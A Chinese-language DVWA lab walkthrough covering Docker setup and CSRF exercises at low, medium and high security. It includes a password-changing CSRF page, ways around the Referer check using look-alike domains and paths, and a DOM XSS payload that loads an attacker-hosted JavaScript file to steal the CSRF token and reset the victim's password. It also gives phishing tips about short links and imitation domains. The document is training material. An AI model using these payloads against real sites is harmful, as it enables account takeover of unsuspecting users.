Damn Vulnerable Web Application (DVWA).

## 1. Install

克隆仓库

```
┌──(sec@debian)-[~]
└─$ git clone https://github.com/digininja/DVWA.git ~/.local/dvwa
```

进入仓库

```
┌──(sec@debian)-[~]
└─$ cd ~/.local/dvwa
```

## 3. Init

释放配置文件

```
┌──(sec@debian)-[~]
└─$ cp ./config/config.inc.php.dist ./config/config.inc.php
```

添加谷歌验证码 reCAPTCHA 并修改默认安全级别

```
┌──(sec@debian)-[~]
└─$ chmod -R 777 ./config && nano -l ./config/config.inc.php
```

```php
27 $_DVWA[ 'recaptcha_public_key' ]  = '6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI';
28 $_DVWA[ 'recaptcha_private_key' ] = '6LeIxAcTAAAAAGG-vFI1TnRWxMZNFuojJ4WifJWe';
33 $_DVWA[ 'default_security_level' ] = 'low';
```

挂载本地配置文件并允许外部的访问

```
┌──(sec@debian)-[~]
└─$ nano -l ./compose.yml
```

```yml
20     volumes:
21       - ./config:/var/www/html/config
24     ports:
25       - 4280:80
```

运行容器

```
┌──(sec@debian)-[~]
└─$ docker compose up -d
```

Port Forwarding Rules

| Name | Host Port | Guest Port |
| ---- | --------- | ---------- |
| DVWA | 49180     | 4280       |

点击 `Create / Reset Database` 初始化

> http://127.0.0.1:49180/setup.php

## 4. Usage

登录 `admin:password` 

> http://127.0.0.1:49180/login.php

修改安全级别

![修改安全级别](./../../../../../images/DVWA/%E4%BD%BF%E7%94%A8/%E4%BF%AE%E6%94%B9%E5%AE%89%E5%85%A8%E7%BA%A7%E5%88%AB.png)

### 4.1. csrf

> http://127.0.0.1:49180/vulnerabilities/csrf/

> 1. 攻击者首先会在自己的个人账户上获取敏感操作的请求包，如：修改密码，修改邮箱，修改手机号，账号删除，转账等操作
> 2. 之后会利用这些请求包构造一个网页形式的 poc，将这个 poc 发送到公网
> 3. 最后诱使目标账号在登录状态下点击 poc 链接，即可伪造用户请求进行敏感操作

### 4.1.1. low

```
目标账户：admin:password
个人账户：gordonb:abc123
```

登录个人账户拦截请求包，并提交修改密码请求

![登录个人账户拦截请求包，并提交修改密码请求](./../../../../../images/DVWA/%E4%BD%BF%E7%94%A8/csrf/low/%E7%99%BB%E5%BD%95%E4%B8%AA%E4%BA%BA%E8%B4%A6%E6%88%B7%E6%8B%A6%E6%88%AA%E8%AF%B7%E6%B1%82%E5%8C%85%EF%BC%8C%E5%B9%B6%E6%8F%90%E4%BA%A4%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81%E8%AF%B7%E6%B1%82.png)

构造 poc

![构造 poc](./../../../../../images/DVWA/%E4%BD%BF%E7%94%A8/csrf/low/%E6%9E%84%E9%80%A0%20poc.png)

将 poc 放在网站上

```shell
┌──(root㉿purple)-[~]
└─# systemctl start apache2 && vim /var/www/html/test.html
```

诱使目标账户在登录状态下访问 poc 链接即可修改目标账户密码修改

> http://kali.local/test.html

> 布置在公网上时可以购买短链接或相似域名伪造官网

### 4.1.2. medium

> 1. 这里使用了 Referer 校验用户请求是否来自官网。
> 2. 假设官网为 `purple.local` ，当用户在这个网站进行操作时校验了服务端当前所在网站为官网，因此是正常请求，不会拦截。
> 3. 但是当目标被诱导使用攻击者伪造的网站 `kali.local` 操作时，服务端会校验当前的网站是否是 `purple.local` ，因此会对 `kali.local` 的请求进行拦截。

绕过方式有两种

1. 域名绕过：伪造网站可申请一个相似域名如 `test.purple.local` 或 `purple.local.cn` 等即可绕过

2. 网址绕过：在伪造网站构造一个含有校验对象的路径，如 `http://kali.local/purple.local.html` 即可绕过

指定 Referer 策略： `no-referrer-when-downgrade` 或 `unsafe-url` 

>  `no-referrer-when-downgrade` 只有当从 HTTPS 降级为 HTTP 时不会发送完整 URL
>
>  `unsafe-url` 永远发送完整 URL
>
> 完整的 URL ：`http://kali.local/purple.local.html` 
>
> 不完整的 URL ：`http://kali.local` 

在一个含有校验对象的路径中构造 POC

```shell
┌──(root㉿purple)-[~]
└─# vim /var/www/html/purple.local.html
```

```html
<!DOCTYPE html>
<html>
<head>
    <meta name="referrer" content="unsafe-url">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="referrer" content="unsafe-url">
</head>
<body>
    <a href="http://127.0.0.1:49180/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change" referrer="unsafe-url">
        csrf
    </a>
</body>
</html>
```

### 4.1.3. high

需要利用 xss(dom) 漏洞获取 token 

> 可以利用 # 注释，# 之后的代码不会发送到服务器，但是可以在本地加载

```
http://centos7-6.local/dvwa/vulnerabilities/xss_d/?default=English#%3Cscript%3Ealert(%22hello%22)%3C/script%3E
```

成功注入

![成功注入](./../../../../../images/DVWA/%E4%BD%BF%E7%94%A8/csrf/high/%E6%88%90%E5%8A%9F%E6%B3%A8%E5%85%A5.png)

构造一个 js 文件，通过 xss 漏洞执行这个文件，获取 token 来进行 csrf 攻击

```shell
┌──(root㉿kali)-[~]
└─# vim /var/www/html/csrf.js
```

```js
//弹出cookie
alert(document.cookie);
//定义AJAX加载的页面
	var theUrl = 'http://centos7-6.local/dvwa/vulnerabilities/csrf/';
//匹配浏览器
if (window.XMLHttpRequest){
// IE7+, Firefox, Chrome, Opera, Safari
		xmlhttp=new XMLHttpRequest(); 
	}else{
// IE6, IE5
		xmlhttp=new ActiveXObject("Microsoft.XMLHTTP"); 
	}
	var count = 0;
//页面加载完成后执行函数
	xmlhttp.onreadystatechange=function(){
//判断请求已完成并且响应就绪状态码为200时执行代码
	if (xmlhttp.readyState==4 && xmlhttp.status==200)
	{
//页面内容存储到text中进行匹配token
		var text = xmlhttp.responseText;
		var regex = /user_token\' value\=\'(.*?)\' \/\>/;
		var match = text.match(regex);
		console.log(match);
//弹出token
		alert(match[1]);
		var token = match[1];
//定义payload url并绑定token为我们从页面匹配到的token并且定义新的密码，新密码是admin
var new_url = 'http://centos7-6.local/dvwa/vulnerabilities/csrf/?user_token='+token+'&password_new=123456&password_conf=123456&Change=Change'
//GET方式提交一次new_url
		if(count==0){
			count++;
			xmlhttp.open("GET",new_url,false);
			xmlhttp.send();
		}
}
};
//GET方式提交theUrl
	xmlhttp.open("GET",theUrl,false);
	xmlhttp.send();

```

通过 xss 漏洞加载 js 文件进行 csrf 攻击来修改密码

```
http://centos7-6.local/dvwa/vulnerabilities/xss_d/?default=English#<script src="http://kali.local/csrf.js"></script>
```

> 可将这个 url 放到伪造页面中

---

Refrences

- [DVWA](https://github.com/digininja/DVWA)
